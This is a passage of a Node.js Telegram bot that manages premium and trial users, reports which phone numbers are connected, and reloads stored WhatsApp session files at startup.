    const userId = /^\d+$/.test(userIdentifier) ? userIdentifier : `@${userIdentifier.replace('@', '')}`;
    
    const premiumUsers = loadPremiumUsers();
    
    // Check if user exists in premium list
    if (!premiumUsers.some(user => user.id === userId)) {
        return bot.sendMessage(chatId, '⚠️ This user is not a premium member.');
    }
    
    // Remove user from premium
    const updatedPremiumUsers = premiumUsers.filter(user => user.id !== userId);
    savePremiumUsers(updatedPremiumUsers);
    
    return bot.sendMessage(chatId, `✅ User ${userId} has been removed from premium members.`);
});

// Command to list all premium users (admin only)
bot.onText(/\/listprem/, (msg) => {
    const chatId = msg.chat.id;
    const username = msg.from.username;
    
    if (!isAdmin(username)) {
        return bot.sendMessage(chatId, '🚫 Sorry, only the admin can use this command.');
    }
    
    const premiumUsers = loadPremiumUsers();
    
    if (premiumUsers.length === 0) {
        return bot.sendMessage(chatId, '📝 There are no premium users at the moment.');
    }
    
    const formattedList = premiumUsers.map((user, index) => {
        const date = new Date(user.addedAt).toLocaleDateString();
        return `${index + 1}. ${user.id} - Added on: ${date}`;
    }).join('\n');
    
    return bot.sendMessage(chatId, `📋 *Premium Users List:*\n\n${formattedList}`, { parse_mode: 'Markdown' });
});

// Command to add trial user (everyone can use)
bot.onText(/\/addtrial/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    
    // Check if the user is already premium
    if (isUserPremium(userId)) {
        return bot.sendMessage(chatId, '🌟 You are already a premium member! No need for a trial.');
    }
    
    // Check if the user is already on trial
    if (isUserOnTrial(userId)) {
        return bot.sendMessage(chatId, '⚠️ You are already on a trial period.');
    }
    
    // Default trial period is 1 day
    const trialDays = 1;
    
    // Calculate expiration date
    const expiresAt = new Date();
    expiresAt.setDate(expiresAt.getDate() + trialDays);
    
    // Add user to trial list
    const trialUsers = loadTrialUsers();
    trialUsers.push({
        id: userId,
        username: msg.from.username || 'Unknown',
        startedAt: new Date().toISOString(),
        expiresAt: expiresAt.toISOString()
    });
    
    saveTrialUsers(trialUsers);
    
    return bot.sendMessage(chatId, `✅ Your ${trialDays}-day trial has been activated! You now have access until ${expiresAt.toLocaleDateString()}.`);
});

// Command to cancel trial (any user can cancel their own trial)
bot.onText(/\/canceltrial/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const trialUsers = loadTrialUsers();
    
    // Check if user is on trial
    if (!isUserOnTrial(userId)) {
        return bot.sendMessage(chatId, '⚠️ You are not currently on a trial period.');
    }
    
    // Remove user from trial list
    const updatedTrialUsers = trialUsers.filter(user => user.id !== userId);
    saveTrialUsers(updatedTrialUsers);
    
    return bot.sendMessage(chatId, '✅ Your trial has been cancelled successfully.');
});



bot.onText(/\/status/, (msg) => {
    const chatId = msg.chat.id;
    const connectedUser  = connectedUsers[chatId];

    if (connectedUser  && connectedUser.length > 0) {
        let statusText = `Bot Status:\n- Connected Numbers:\n`;
        connectedUser .forEach(user => {
            const uptime = Math.floor((Date.now() - user.connectedAt) / 1000); // Runtime in seconds
            statusText += `${user.phoneNumber} (Uptime: ${uptime} seconds)\n`;
        });
        bot.sendMessage(chatId, statusText);
    } else {
        bot.sendMessage(chatId, `You have no registered numbers.`);
    }
});


// Function to load all session files
async function loadAllSessions() {
    const sessionsDir = path.join(__dirname, 'SESSIONS');
    if (!fs.existsSync(sessionsDir)) {
        fs.mkdirSync(sessionsDir);
    }

    const sessionFiles = fs.readdirSync(sessionsDir);
    for (const file of sessionFiles) {
        const phoneNumber = file.replace('session_', '');
        await startWhatsAppBot(phoneNumber);
    }
}

// Ensure all sessions are loaded on startup
loadConnectedUsers(); // Load Connected users from the JSON file
loadAllSessions().catch(err => {
    console.log('Error loading sessions:', err);
});

// Start the bot
console.log('Telegram bot is running...');


let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(`Update ${__filename}`)
    delete require.cache[file]
    require(file)
})